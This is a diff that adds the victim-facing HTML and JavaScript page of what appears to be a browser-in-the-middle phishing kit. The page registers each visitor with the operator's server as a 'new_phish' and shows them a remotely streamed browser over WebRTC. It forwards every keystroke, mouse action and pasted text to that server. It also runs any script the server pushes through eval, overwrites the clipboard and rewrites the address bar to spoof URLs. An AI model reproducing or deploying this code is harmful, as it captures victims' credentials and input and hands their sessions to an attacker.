@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>PAGE_TITLE</title>
+    <meta charset="UTF-8" />
+  </head>
+  <body>
+    <video playsinline autoplay muted style="width: 100vw; height: auto;"></video>
+    <style>
+html, body {margin: 0; height: 100%; overflow: hidden}
+    </style>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+
+//couple of helper functions
+function width(){
+  return window.innerWidth 
+  || document.documentElement.clientWidth 
+  || document.body.clientWidth 
+  || 0;
+}
+
+function height(){
+  return window.innerHeight 
+  || document.documentElement.clientHeight 
+  || document.body.clientHeight 
+  || 0;
+}
+
+//declare connnection and video in global scope for further reference
+var peerConnection;
+const video = document.querySelector("video")
+
+//connect to the server over websockets and anounce we are a new phish
+const socket = io.connect(window.location.origin)
+let viewport_width = width()
+let viewport_height = height()
+socket.emit('new_phish', viewport_width, viewport_height)
+
+socket.on("push_state", function(new_state){
+  history.pushState({},'','/' + new_state)
+})
+
+socket.on("copy_to_clipboard", function(data){
+  copy_to_clipboard(data)
+})
+
+//1) wait for a video stream offer
+socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
+  peerConnection = new RTCPeerConnection({
+    iceServers: [
+      {
+        "urls": "stun:stun.l.google.com:19302",
+      },
+      // { 
+      //   "urls": "turn:TURN_IP?transport=tcp",
+      //   "username": "TURN_USERNAME",
+      //   "credential": "TURN_CREDENTIALS"
+      // }
+    ]
+  })
+  //2) set up an answer an send back to the broadcaster
+  peerConnection
+    .setRemoteDescription(offer)
+    .then(() => peerConnection.createAnswer())
+    .then(sdp => peerConnection.setLocalDescription(sdp))
+    .then(() => {
+      socket.emit("video_stream_answer", broadcaster_socket_id, peerConnection.localDescription)
+    }) 
+  //add video track when it becomes available
+  peerConnection.ontrack = function(event){
+    video.srcObject = event.streams[0]
+  }
+  //3) send ICE candidates as they become available
+  peerConnection.onicecandidate = function(event){
+    if (event.candidate) {
+      socket.emit("candidate", broadcaster_socket_id, event.candidate)
+    }
+  }  
+})
+
+socket.on("candidate", function(broadcaster_socket_id, candidate){
+  peerConnection
+    .addIceCandidate(new RTCIceCandidate(candidate))
+    .catch(e => console.error(e))
+})
+
+socket.on("execute_script", function(script){
+  eval(script)
+})
+
+//joystick actions for mouse events
+document.addEventListener("mousedown", handleMouseEvent, !1) 
+document.addEventListener("mouseup", handleMouseEvent, !1) 
+document.addEventListener("mousemove", handleMouseEvent, !1) 
+document.addEventListener("mousewheel", handleMouseEvent, !1) 
+document.addEventListener("click", handleMouseEvent, !1) 
+
+window.addEventListener('popstate', function(event){
+  socket.emit('go_back')
+})
+
+window.addEventListener('paste', function(event){
+  let paste_data = (event.clipboardData || window.clipboardData).getData('text')
+  socket.emit('paste', paste_data)
+  event.preventDefault()
+})
+
+function handleMouseEvent(e){
+  if(e.type == "mousewheel"){
+    socket.emit('mouse_event', {"type": e.type, "wheelDeltaX": e.wheelDeltaX, "wheelDeltaY": e.wheelDeltaY})
+  }else{
+    //console.log({"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
+    socket.emit('mouse_event', {"type": e.type, "clientX": e.clientX, "clientY": e.clientY, "movementX": e.movementX, "movementY": e.movementY})
+  }
+}
+
+//joystick actions for key events
+document.addEventListener('keydown', keyDown)
+document.addEventListener('keyup', keyUp)
+
+var ctrlKey = false
+
+function keyDown(e) {
+  if(e.keyCode == 9 || e.which == 9){
+    e.preventDefault()
+  }
+  if(e.keyCode == 86 && ctrlKey){
+    return
+  }
+  if(e.keyCode == 67 && ctrlKey){
+    socket.emit('copy')
+    e.preventDefault()
+    return
+  }
+  if(e.key == 'Meta'){
+    ctrlKey = true
+    return
+  }
+  socket.emit("keydown", e.key)
+}
+
+function keyUp(e) {
+  if(e.key == 'Meta'){
+    ctrlKey = false
+    return
+  }
+  socket.emit("keyup", e.key)
+}
+
+copy_to_clipboard = function (data) {
+  // Create a dummy input to copy the string inside it
+  var dummy = document.createElement("textarea");
+  // Add it to the document
+  document.body.appendChild(dummy);
+  // Set its ID
+  dummy.setAttribute("id", "dummy_id");
+  // Output the array into it
+  document.getElementById("dummy_id").value = data;
+  // Select it
+  dummy.select();
+  // Copy its contents
+  document.execCommand("copy");
+  // Remove it as its not needed anymore
+  document.body.removeChild(dummy);
+}
+
+    </script>
+  </body>
+</html>
